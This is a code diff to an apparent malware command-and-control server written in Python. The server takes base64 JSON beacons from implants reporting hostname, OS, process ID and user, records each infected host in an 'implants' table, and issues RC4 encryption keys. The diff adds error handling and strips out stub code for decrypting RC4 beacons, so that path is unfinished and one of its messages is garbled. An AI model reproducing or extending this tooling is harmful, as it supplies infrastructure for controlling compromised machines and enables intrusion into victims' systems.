@@ -98,51 +98,47 @@ class WebServer(object):
         """
         self.data = request.get_data()
 
-        # if initial base64 beacon
+        # if initial beacon
         if self.is_base64(self.data) is True:
-            # base64 decodes
-            decoded = base64.b64decode(self.data).decode()
+            try:
+                # base64 decodes
+                decoded = base64.b64decode(self.data).decode()
 
-            # parses json post data
-            j = json.loads(decoded)
-            hostname = j["h"]
-            operating_system = j["o"]
-            process_id = j["p"]
-            current_user = j["u"]
+                # parses json post data
+                j = json.loads(decoded)
+                hostname = j["h"]
+                operating_system = j["o"]
+                process_id = j["p"]
+                current_user = j["u"]
 
-            # generates a random 32 character encryption key (only lower/upper letters, no numbers)
-            # numbers fucks up the rc4 crypt() function for some reason
-            encryption_key = "".join(random.SystemRandom().choice(string.ascii_letters) for _ in range(32))
+                # generates a random 32 character encryption key (only lower/upper letters, no numbers)
+                # numbers fucks up the rc4 crypt() function for some reason
+                encryption_key = "".join(random.SystemRandom().choice(string.ascii_letters) for _ in range(32))
 
-            # gets current time (uses server's time)
-            now = datetime.datetime.now()
-            time = now.strftime("%Y-%m-%d %H:%M:%S")
+                # gets current time (uses server's time)
+                now = datetime.datetime.now()
+                time = now.strftime("%Y-%m-%d %H:%M:%S")
 
-            # inserts an entry into the "implants" table
-            with self.connection.cursor() as cursor:
-                statement = "INSERT INTO `implants` (`hostname`, `current_user`, `process_id`, `operating_system`, `last_seen`, `encryption_key`) VALUES (%s, %s, %s, %s, %s, %s)"
-                cursor.execute(statement, (hostname,
-                                           current_user,
-                                           process_id,
-                                           operating_system,
-                                           time,
-                                           encryption_key))
+                # inserts an entry into the "implants" table
+                with self.connection.cursor() as cursor:
+                    statement = "INSERT INTO `implants` (`hostname`, `current_user`, `process_id`, `operating_system`, `last_seen`, `encryption_key`) VALUES (%s, %s, %s, %s, %s, %s)"
+                    cursor.execute(statement, (hostname,
+                                               current_user,
+                                               process_id,
+                                               operating_system,
+                                               time,
+                                               encryption_key))
 
-            # returns base64 encoded encryption key in the http response
-            return base64.b64encode(encryption_key.encode())
+                # returns base64 encoded encryption key in the http response
+                return base64.b64encode(encryption_key.encode())
+
+            except UnicodeDecodeError:
+                return "random weird exception where we need that's actually an rc4 beacon"
+
+            except Exception as e:
+                print("ERROR!")
+                return str(e)
 
         # else rc4 beacon
         else:
-            # queries all encryption keys in the "implants" table
-            with self.connection.cursor() as cursor:
-                cursor.execute("SELECT `encryption_key` FROM `implants`")
-                results = cursor.fetchall()
-
-                # need to explicitly cast key from tuple to string here
-                for key in results:
-                    print("trying key: " + str(key))
-                    #print("potentially decrypted: " + self.crypt(str(key), self.data))
-
-            #print(self.crypt("WvpMvdDqbmTwPVJybgQBnKoTQbbfRZKE", self.data))
-
             return "rc4 beacon"
